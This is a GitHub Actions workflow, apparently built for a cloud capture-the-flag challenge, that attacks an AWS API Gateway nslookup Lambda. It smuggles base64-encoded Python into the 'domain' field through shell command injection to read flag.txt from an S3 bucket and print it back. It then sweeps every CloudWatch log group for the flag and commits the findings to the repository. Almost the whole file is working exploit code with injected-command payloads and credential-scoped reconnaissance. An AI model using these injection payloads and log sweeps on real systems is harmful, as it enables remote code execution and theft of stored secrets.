name: recon

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: write

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4
        with:
          token: ${{ github.token }}

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Capture Lambda stdout response
        run: |
          URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
          echo "# response capture $(date -u)" > response_dump.txt

          # Inject Python that prints flag hex to stdout
          # If Lambda captures subprocess stdout, the flag appears in the response body
          PY="import boto3;s3=boto3.client('s3');flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();print('FLAG_HEX:'+flag.hex());print('FLAG_ASCII:'+flag.decode('latin-1'));print('FLAG_LEN:'+str(len(flag)))"
          B64=$(echo -n "$PY" | base64 -w0)

          echo "=== curl response with stdout injection ===" | tee -a response_dump.txt
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "{\"domain\":\"x; echo $B64 | base64 -d | python3 #\"}" | tee -a response_dump.txt
          echo "" | tee -a response_dump.txt

          # Also try with stderr redirect to stdout
          PY2="import boto3,sys;s3=boto3.client('s3');flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();sys.stderr.write('FLAG_HEX:'+flag.hex()+'\n');print('FLAG_HEX:'+flag.hex())"
          B64_2=$(echo -n "$PY2" | base64 -w0)

          echo "=== curl response with stderr+stdout ===" | tee -a response_dump.txt
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "{\"domain\":\"x; echo $B64_2 | base64 -d | python3 2>&1 #\"}" | tee -a response_dump.txt
          echo "" | tee -a response_dump.txt

          # Try writing to /tmp and then cat-ing it (if Lambda returns file content)
          PY3="import boto3;s3=boto3.client('s3');flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();open('/tmp/flag.hex','w').write(flag.hex())"
          B64_3=$(echo -n "$PY3" | base64 -w0)
          INJ3="x; echo $B64_3 | base64 -d | python3; cat /tmp/flag.hex #"

          echo "=== curl response with /tmp cat trick ===" | tee -a response_dump.txt
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "{\"domain\":\"$INJ3\"}" | tee -a response_dump.txt
          echo "" | tee -a response_dump.txt

          cat response_dump.txt

      - name: Check CloudWatch logs with broad IAM scan
        run: |
          echo "=== All available CW log groups ===" >> response_dump.txt
          aws logs describe-log-groups --region us-east-1 2>&1 >> response_dump.txt || true

          echo "=== Lambda log groups ===" >> response_dump.txt
          aws logs describe-log-groups --log-group-name-prefix "/aws/lambda" --region us-east-1 2>&1 >> response_dump.txt || true

          # Check every Lambda log group for recent events containing FLAG
          aws logs describe-log-groups --region us-east-1 2>/dev/null | \
            grep '"logGroupName"' | grep -oP '(?<="logGroupName": ")[^"]+' | \
            while IFS= read -r group; do
              echo "--- $group ---" >> response_dump.txt
              STREAM=$(aws logs describe-log-streams \
                --log-group-name "$group" \
                --order-by LastEventTime \
                --descending \
                --max-items 1 \
                --region us-east-1 2>/dev/null | \
                grep '"logStreamName"' | grep -oP '(?<="logStreamName": ")[^"]+' | head -1)
              if [ -n "$STREAM" ]; then
                aws logs get-log-events \
                  --log-group-name "$group" \
                  --log-stream-name "$STREAM" \
                  --limit 20 \
                  --region us-east-1 2>/dev/null | \
                  grep -i "FLAG\|hex\|356\|codec" >> response_dump.txt || true
              fi
            done

          cat response_dump.txt

      - name: Commit results
        run: |
          git config user.email "bot@github-actions"
          git config user.name "GitHub Actions"
          git add response_dump.txt
          git commit -m "response capture + CW scan" || echo "Nothing to commit"
          git push origin corgi
